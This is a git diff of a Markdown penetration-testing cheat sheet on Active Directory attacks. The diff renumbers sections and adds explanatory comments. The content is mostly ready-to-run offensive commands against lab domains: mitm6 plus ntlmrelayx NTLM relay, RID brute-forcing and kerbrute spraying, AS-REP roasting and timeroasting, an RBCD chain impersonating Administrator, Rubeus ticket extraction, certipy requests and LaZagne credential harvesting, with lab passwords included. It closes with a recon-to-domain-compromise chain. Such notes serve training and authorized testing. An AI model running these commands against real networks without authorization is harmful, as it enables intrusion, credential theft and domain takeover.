@@ -15,11 +15,11 @@ fping -asgq 172.16.7.0/23
 
 **Fast scan of a specific host**
 ```bash
-nmap -p- -Pn -T4 --min-rate 2000 --max-retries 5 -oN open_tcp_ports 10.10.10.10
+# TCP — full port scan
+nmap -p- -Pn -T4 --min-rate 2000 --max-retries 2 -oN open_tcp_ports 10.10.10.10
 
+# UDP
 sudo nmap -sU --min-rate=400 --min-parallelism=512 --open -oN open_udp_ports 10.10.10.10
-
-2 RETRY
 ```
 
 ---
@@ -30,18 +30,21 @@ Reference: [DNS Attacks and Enumeration](https://github.com/Aghalarovf/Penetrati
 
 ---
 
-## 4. VHOST Enumeration
+## 3. VHOST Enumeration
+
 Reference: [VHOST Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Web_Application/Web-Tools/Ffuf.md)
 
 ---
 
-## 7. Email and Comment Collector with ReconSpider
+## 4. Email and Comment Collector with ReconSpider
+
 Reference: [ReconSpider](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Web_Application/Crawl%20Methods/ReconSpider.md)
 
 ---
 
-## 8. Technology Enumeration
-```powershell
+## 5. Technology Enumeration
+
+```
 Retire.js
 Wappalyzer
 BuiltWith
@@ -55,7 +58,7 @@ HackTools
 
 ---
 
-## 10. Pivoting and Internal Network Discovery
+## 6. Pivoting and Internal Network Discovery
 
 **Metasploit — ping sweep through a session**
 ```
@@ -67,289 +70,350 @@ msf6 post(multi/gather/ping_sweep) > run
 
 ---
 
-## 11. Change Kerberos Clock
-```powershell
+## 7. Kerberos Clock Sync
+
+```bash
 sudo ntpdate domain.local
 ```
 
-## 12. LDAP Enumeration
+---
+
+## 8. LDAP Enumeration
 
 Reference: [LDAP Architecture & Queries](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Protocols/LDAP/LDAP-Architecture.md)
 
 ---
 
-## 13. SMB Enumeration
+## 9. SMB Enumeration
 
 Reference: [SMB Protocol Attacks](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Services/Services-Attacks/SMB-Attack.md)
 
 ---
 
-## 14. LLMNR Poisoning Trigger
+## 10. LLMNR Poisoning Trigger
 
 Reference: [NTLM Hash Capture Triggers](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR%20Poisining%20Triggers.md)
 
 ---
 
-## 15. LLMNR / mDNS / NBT-NS Poisoning
+## 11. LLMNR / mDNS / NBT-NS Poisoning
 
 Reference: [LLMNR/mDNS/NBT-NS Poisoning](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)
 
 ---
 
-## 15. IPv6 + mitm6 → NTLM relay
+## 12. IPv6 + mitm6 → NTLM Relay
 
-```powershell
+```bash
 mitm6 -d domain.com &
 ntlmrelayx.py -6 -t smb://<DC_IP> -wh fakewpad -l loot
 ```
 
 ---
 
-## 16. Enumeration with NXC
+## 13. Enumeration with NetExec (NXC)
 
 Reference: [NetExec](https://github.com/Aghalarovf/Penetration-Tester/edit/main/Technical_Notes/Active_Directory/AD-Tools/Netexec.md)
 
 ---
 
-## 19. Username Enumeration
+## 14. Username Enumeration
 
 ```bash
-# NXC
+# RID brute-force via NXC
 nxc smb dc.sendai.vl -u 'test' -p '' --rid-brute 10000 > nxc_result.txt
 cat nxc_result.txt | grep TypeUser | awk '{ print $6}' | cut -d '\' -f 2 > users.txt
 
-nxc smb dc.sendai.vl -u users.txt -p '' ( PASSWORD_CHANGE_MUST )
+# Test users with blank password (catches PASSWORD_MUST_CHANGE accounts)
+nxc smb dc.sendai.vl -u users.txt -p ''
 
-# Usernameanarchy
+# Generate username wordlist from full names
 ./username-anarchy --input-file /home/sako/Labaratory/hostname
 
-# Kerbrute
+# Enumerate valid usernames via Kerberos
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 ```
 
 ---
 
-## 20. Password Spraying
+## 15. Password Spraying
 
-```powershell
-cme smb <DC_IP> -u <user> -p <pass> --pass-pol
+```bash
+# Check lockout policy first — always do this before spraying
+nxc smb <DC_IP> -u <user> -p <pass> --pass-pol
 
-# Lockout threshold 5 dirsə → maksimum 3 cəhd et
-# Sonra observation window qədər gözlə (adətən 30 dəq)
+# Rule: if lockout threshold = 5, attempt max 3 passwords, then wait observation window (~30 min)
 
-# kerbrute-da delay:
-kerbrute passwordspray ... --delay 1000  # 1 saniyə
+# Kerbrute spray with delay
+kerbrute passwordspray --dc <DC_IP> -d <domain> users.txt 'Password123!' --delay 1000
 
-# crackmapexec throttle:
-crackmapexec smb ... --jitter 5
-
-1. Tapılan bütün servis hesablarının şifrələrini digər bütün istifadəçilər üçün password spray
-2. Default Credentials
-3.
-
-# User enumeration əvvəlcə
-kerbrute userenum --dc <DC_IP> -d <domain> users.txt
-
-# Spray
-kerbrute passwordspray --dc <DC_IP> -d <domain> users.txt 'Password123!'
-
+# CrackMapExec spray with jitter
+crackmapexec smb <DC_IP> -u users.txt -p 'Password123!' --no-bruteforce --continue-on-success --jitter 5
 ```
 
-## 16. Enumerate Writable Objects
-```powershell
+**Spray Strategy:**
+1. Spray all discovered service account passwords against all users
+2. Try default credentials per service (Tomcat, Jenkins, MSSQL, etc.)
+3. Try seasonal/company-name passwords: `Summer2025!`, `CompanyName2025!`
+
+---
+
+## 16. Writable Object Enumeration
+
+```bash
 bloodyAD --host <target-ip> --dns <target-ip> -d checkpoint.htb \
-  -u alex.turner -p '<provided-password>' get writable
+  -u alex.turner -p '<password>' get writable
 ```
 
 ---
 
-## 16. AS-REP Roasting
-```powershell
-python3 /home/sako/Tools/Impacket/examples/GetNPUsers.py cicada.vl/ -usersfile valid_users -format hashcat -outputfile hashes.txt
+## 17. AS-REP Roasting
+
+```bash
+python3 GetNPUsers.py cicada.vl/ -usersfile valid_users -format hashcat -outputfile hashes.txt
 ```
+
 Reference: [Identify pre-auth-disabled users and capture hashes](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/AS-REP_Roasting.md)
 
 ---
 
-## 17. Kerberoasting
+## 18. Kerberoasting
 
 Reference: [Identify SPN accounts, request TGS tickets, and crack offline](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Kerberoasting.md)
 
 ---
 
-## 18. Timeroasting
-```powershell
+## 19. Timeroasting
+
+```bash
+# Enumerate and capture
 nxc smb dc.rustykey.htb -k -M timeroast
 
+# Crack offline
 hashcat -m 31300 time_hashes /usr/share/wordlists/rockyou.txt
-```
-
-## 18. Lookup SIDs
-```powershell
-impacket-lookupsid -k -no-pass -target-ip 10.10.11.75 dc.rustykey.htb
-```
-
-## 18. Pre2K
-```powershell
-Pre-Windows 2000 Compatible Access GROUP --> Potential Vulnerable Computer account
-
-netexec ldap MACHINE_IP -u pentest -p 'p3nt3st2025!&' -M pre2k
-kinit 'fs01$'
 ```
 
 ---
 
-## 18. Delegation
-```powershell
+## 20. SID Lookup
+
+```bash
+impacket-lookupsid -k -no-pass -target-ip 10.10.11.75 dc.rustykey.htb
+```
+
+---
+
+## 21. Pre-Windows 2000 Compatible Access (Pre2K)
+
+```bash
+# Check if the group has vulnerable computer accounts
+nxc ldap <DC_IP> -u pentest -p 'p3nt3st2025!&' -M pre2k
+
+# Obtain TGT using the computer account
+kinit 'fs01$'
+```
+
+> **Note:** Look for members of the **Pre-Windows 2000 Compatible Access** group — computer accounts in this group may have weak or default passwords.
+
+---
+
+## 22. Delegation Enumeration
+
+```bash
+# Find accounts trusted for delegation
 nxc ldap dc.sendai.vl -u user -p pass --trusted-for-delegation
 nxc ldap dc.sendai.vl -u user -p pass --find-delegation
-
 impacket-findDelegation sendai.vl/user:pass
 ```
 
 ---
 
-## 18. RBCD
-```powershell
+## 23. Resource-Based Constrained Delegation (RBCD)
+
+```bash
+# Check machine account quota (MAQ)
 nxc ldap dc.sendai.vl -u user -p pass -M maq
 
+# Create a fake computer account
 impacket-addcomputer sendai.vl/user:pass \
   -computer-name 'FAKE$' -computer-pass 'Pass123!'
 
+# Write RBCD attribute
 impacket-rbcd sendai.vl/user:pass \
   -action write -delegate-to TARGET$ \
   -delegate-from FAKE$
 
+# Request service ticket impersonating Administrator
 impacket-getST -spn cifs/TARGET.sendai.vl \
   -impersonate Administrator \
   sendai.vl/FAKE$:Pass123!
 ```
 
-## 20. Credential Discovery 
+---
+
+## 24. Credential Discovery
 
 Reference: [Username & Password Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Credential%20Harvesting.md)
 
 ---
 
-## 21. Data Visualization with BloodHound
+## 25. Data Visualization with BloodHound
 
-Reference: [Data Collect and Visualization](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Tools/BloodHound.md)
+Reference: [Data Collection and Visualization](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Tools/BloodHound.md)
 
 ---
 
-## 22. Terminal History
-```
+## 26. Shell / Terminal History
+
+```powershell
+# PowerShell history
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
+# Bash history (Linux pivot)
+cat ~/.bash_history
 history
 ```
 
 ---
 
-## 23. Service Accounts TGT Delegation
-```
+## 27. Service Account TGT via Delegation (Unconstrained)
+
+```powershell
+# Dump TGT for delegation-enabled service accounts
 .\Rubeus.exe tgtdeleg /nowrap
 
+# Convert to usable format
 nano svc_sql.kirbi.b64
 cat svc_sql.kirbi.b64 | base64 -d > svc_sql.kirbi
-
 impacket-ticketConverter svc_sql.kirbi svc_sql.ccache
 export KRB5CCNAME=svc_sql.ccache
 
-certipy req -u svc_sql -k -no-pass -target DC02.darkzero.ext -ca 'darkzeroext-DC02-CA' -template 'user'
+# Request AD CS certificate as that service account
+certipy req -u svc_sql -k -no-pass -target DC02.darkzero.ext \
+  -ca 'darkzeroext-DC02-CA' -template 'user'
 ```
 
 ---
 
-
-## 23. Credentialed Enumeration
+## 28. Credentialed Enumeration — From Linux
 
 ```bash
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
-sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
-sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+# User and group enumeration
+nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users
+nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
 
+# Share enumeration
+nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+
+# SMBMap
 smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
-smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 \
+  -R 'Department Shares' --dir-only
 ```
 
 ---
 
-## 24. Credentialed Enumeration — From Windows
+## 29. Credentialed Enumeration — From Windows
 
-**Snaffler — share/credential discovery**
 ```powershell
+# Snaffler — find credentials in shares and files
 .\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data -o result_snaffler.txt
 
-.\LaZagne.exe -a
+# LaZagne — local credential harvesting
+.\LaZagne.exe all
 
+# WinPEAS — full local enumeration
 .\WinPeas.exe
 ```
 
 ---
 
-## 25. Living off the Land
+## 30. Living off the Land
 
 Reference: [Maximizing information via PowerShell & CMD](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/Living%20Of%20The%20Land.md)
 
 ---
 
-## 26. Local Privilege Escalation
+## 31. Local Privilege Escalation
 
 Reference: [Windows Privilege Escalation](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Privilege%20Escalation/Windows)
 
 ---
 
-## 27. GPO Abuse
+## 32. GPO Abuse
 
-Reference: [GPO Abuse tactics](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/GPO%20Attacks.md)
+Reference: [GPO Abuse Tactics](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/GPO%20Attacks.md)
 
 ---
 
-## 29. Active Directory Certificate Service Vulnerabilities
+## 33. Active Directory Certificate Services (AD CS)
 
 Reference: [ESC Vulnerabilities and Server Misconfiguration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/Certificate%20Services/Vuln%20Enumerate.md)
 
 ---
 
-## 30. LAPS Dumping
+## 34. LAPS Dumping
 
 Reference: [Retrieve LAPS-managed local admin passwords](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/LAPS%20Dumping.md)
 
 ---
 
-## 31. DCSync Attacks
+## 35. DCSync Attack
 
 Reference: [Dump password hashes via DCSync](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/DCSync.md)
 
 ---
 
-## 32. SAM / SECURITY / SYSTEM Hive Dumping
+## 36. SAM / SECURITY / SYSTEM Hive Dumping
 
 Reference: [Dump SAM, SECURITY, and SYSTEM hives for local hashes](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/SAM-SYSTEM-SECURITY%20Dump.md)
 
 ---
 
-## 33. LSASS Dumping
+## 37. LSASS Dumping
 
 Reference: [LSASS memory dump techniques](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LSASS%20Dump.md)
 
 ---
 
-## 34. NTDS.dit Dumping
+## 38. NTDS.dit Dumping
 
 Reference: [Dump domain-wide hashes from NTDS.dit](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/NTDS%20Dump.md)
 
 ---
 
-## 35. Credential Manager / Windows Vault
+## 39. Credential Manager / Windows Vault
 
 Reference: [Extract stored credentials from Windows Credential Manager](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Windows%20Credential%20Manager.md)
 
 ---
 
-## 36. noPAC + PrintNightmare + PetitPotam
+## 40. noPAC + PrintNightmare + PetitPotam
 
 Reference: [Combined exploitation chain](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/BleedingEdge.md)
+
+---
+
+## Attack Chain Summary
+
+```
+Recon (Nmap, DNS, VHOST)
+    ↓
+Unauthenticated Enumeration (LDAP, SMB, RID brute, Kerbrute)
+    ↓
+Hash Capture (Responder, mitm6, Coercer, PetitPotam)
+    ↓
+Initial Foothold (Password Spray, AS-REP, Default Creds)
+    ↓
+Credentialed Enumeration (BloodHound, NXC, Snaffler)
+    ↓
+Privilege Escalation (Local PrivEsc, GPO, Delegation, AD CS)
+    ↓
+Credential Harvesting (LSASS, SAM, NTDS, DPAPI, LaZagne)
+    ↓
+Lateral Movement (Pass-the-Hash, Pass-the-Ticket, WMIExec)
+    ↓
+Domain Compromise (DCSync, Golden Ticket, RBCD)
+```
